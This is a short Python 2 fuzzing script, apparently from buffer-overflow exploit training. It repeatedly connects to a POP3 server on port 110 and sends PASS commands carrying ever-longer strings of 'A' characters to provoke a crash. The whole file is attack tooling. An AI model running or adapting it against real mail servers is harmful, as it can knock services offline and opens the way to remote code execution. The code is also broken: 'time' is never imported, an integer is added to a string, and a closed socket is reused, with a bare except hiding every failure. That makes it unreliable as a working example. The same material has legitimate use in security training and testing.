import socket

ip = '192.168.0.10'
port = 110
buffer = "A" * 100
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
while len(buffer) <= 4000:
    try:
        print "We are fuzzing with a length of %s bytes" % len(buffer)
        s.connect((ip, port))
        data = s.recv(1024)
        # EDIT the commands here
        s.send('USER ' + '\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        data = s.recv(1024)
        s.close()
        print"\nDone!"
        buffer += 100
        time.sleep(0.3)
    except:
        print "Could not connect to POP3 for some reason..."
